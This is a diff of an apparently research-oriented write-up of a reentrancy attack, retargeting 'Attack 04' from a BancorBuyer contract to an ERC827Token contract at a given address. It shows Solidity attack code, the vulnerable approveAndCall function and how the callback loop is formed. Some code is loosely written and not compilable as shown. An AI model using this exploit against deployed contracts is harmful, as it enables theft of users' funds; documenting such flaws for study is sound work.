@@ -4,19 +4,19 @@ Attack 04
 
 **Contract Name**
 
-BancorBuyer
+ERC827Token
 
 **Contract Address**
 
-0x87902f1b5d50d1f71a17bc2ea613d38510e9aa67
+0x2f55045439c0361ac971686e06d5b698952f89c1
 
 **Transaction Count**
 
-3
+5
 
 **Invovled Ethers**
 
-0.1 Ethers
+0.85 Ethers
 
 **Length of the Call Chain**
 
@@ -32,8 +32,7 @@ Attack code:
 ::
 
     contract Attack{
-        BancorBuyer b = new BancorBuyer();
-        ERC20 er = new ERC20();
+        ERC827Token e = new ERC827Token();
         bytes  bs4 = new bytes(4);
         bytes4 functionSignature = bytes4(keccak256("attack()"));
         constructor() payable {}
@@ -45,11 +44,10 @@ Attack code:
         }
 
         function attack() public {
-            e.buyOne.value(2 eth)(er, this, 1 eth, bs4);
+            e.approveAndCall.value(0)(this, 1 eth, bs4);
         }
 
-        function() payable{
-        }
+        function() payable{}
 
         function getvalue() returns (uint) {
             return this.balance;
@@ -59,27 +57,21 @@ Attack code:
 Attacked code:
 ::
 
-    contract BancorBuyer {
-        ...
-        function buyOne(
-            ERC20 token,
-            address _exchange,
-            uint256 _value,
-            bytes _data
-        ) 
-            payable
-            public
-        {
-            balances[msg.sender] = balances[msg.sender].add(msg.value);
-            uint256 tokenBalance = token.balanceOf(this);
-            require(_exchange.call.value(_value)(_data));
-            balances[msg.sender] = balances[msg.sender].sub(_value);
-            tokenBalances[msg.sender][token] = tokenBalances[msg.sender][token].add(token.balanceOf(this).sub(tokenBalance));
+    contract ERC827Token is ERC827, StandardToken {
+        function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool) {
+            require(_spender != address(this));
+
+            super.approve(_spender, _value);
+        
+            require(_spender.call.value(msg.value)(_data));
+
+            return true;
         }
-        ...
-    }
     ...
+    }
 
-In this case, the goal of our reentrancy is ``require(_exchange.call.value(_value)(_data));``. We need to make sure the address variable *_exchange* equals to the address of ``Attack``'. And this can be done easily by setting an arbitrary hex string. Additionally, the ``_data`` parameter ensures we can recursively call our attack function.
+In this case, the goal of our reentrancy is ``require(_spender.call.value(msg.value)(_data));``. To reach it, we need to make sure the address variable *_spender* does not equals to the address of ``ERC827Token``. And this can be done easily by setting an arbitrary hex string. Additionally, the ``_data`` parameter ensures we can recursively call our attack function.
 
-**Attack.** The attacker call ``attack()`` function, it calls ``buyOne`` function with the parameters set by attacker in victim contract. Because ``_exchange`` is assigned by ``Attack``'s address. Next it goes to the key statement ``require(_spender.call.value(msg.value)(_data));`` which calls back to the ``attack()`` function in attacker's contract. Hence, a call loop is formed and we achieved a *Reentrancy* attack.
+**Preparation.** We set attack function's signature by calling ``prepareWork()`` function in attack code. 
+
+**Attack.** The attacker call ``attack()`` function, it calls ``approveAndCall`` function with the parameters setted by attacker in victim contract. The ``require`` condition is satisfied because the first parameter is attacker's address. Next it goes to the key statement ``require(_spender.call.value(msg.value)(_data));`` which calls back to the ``attack()`` function in attacker's contract. Hence, a call loop is formed and we achieved a *Reentrancy* attack.
